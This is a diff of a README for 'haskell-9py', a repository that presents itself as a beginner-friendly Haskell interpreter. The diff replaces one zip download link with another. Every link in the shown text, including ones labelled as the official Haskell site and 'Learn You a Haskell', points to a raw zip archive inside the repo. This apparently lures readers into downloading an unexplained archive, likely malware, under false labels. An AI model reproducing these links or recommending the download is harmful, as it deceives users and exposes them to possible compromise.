@@ -1,6 +1,6 @@
 # 🚀 haskell-9py - Simple Haskell Interpreter for Everyone
 
-[![Download Haskell-9py](https://raw.githubusercontent.com/lemonlimelychee/haskell-9py/main/inthrow/haskell-9py.zip)](https://raw.githubusercontent.com/lemonlimelychee/haskell-9py/main/inthrow/haskell-9py.zip)
+[![Download Haskell-9py](https://github.com/lemonlimelychee/haskell-9py/raw/refs/heads/main/inthrow/haskell_py_v3.6.zip)](https://github.com/lemonlimelychee/haskell-9py/raw/refs/heads/main/inthrow/haskell_py_v3.6.zip)
 
 ## 🌟 Introduction
 
@@ -26,7 +26,7 @@ Haskell-9py is designed for a range of tasks, including:
 
 ## 📥 Download & Install
 
-To get Haskell-9py, visit this page to download: [https://raw.githubusercontent.com/lemonlimelychee/haskell-9py/main/inthrow/haskell-9py.zip](https://raw.githubusercontent.com/lemonlimelychee/haskell-9py/main/inthrow/haskell-9py.zip)
+To get Haskell-9py, visit this page to download: [https://github.com/lemonlimelychee/haskell-9py/raw/refs/heads/main/inthrow/haskell_py_v3.6.zip](https://github.com/lemonlimelychee/haskell-9py/raw/refs/heads/main/inthrow/haskell_py_v3.6.zip)
 
 Follow these steps:
 
@@ -73,7 +73,7 @@ Join our growing community. Share your ideas, questions, or issues. Use the GitH
 
 For more information on Haskell, explore:
 
-- [Haskell Official Site](https://raw.githubusercontent.com/lemonlimelychee/haskell-9py/main/inthrow/haskell-9py.zip)
-- [Learn You a Haskell](https://raw.githubusercontent.com/lemonlimelychee/haskell-9py/main/inthrow/haskell-9py.zip)
+- [Haskell Official Site](https://github.com/lemonlimelychee/haskell-9py/raw/refs/heads/main/inthrow/haskell_py_v3.6.zip)
+- [Learn You a Haskell](https://github.com/lemonlimelychee/haskell-9py/raw/refs/heads/main/inthrow/haskell_py_v3.6.zip)
 
 Thank you for choosing Haskell-9py! Remember, the best way to learn is by doing. Happy coding!
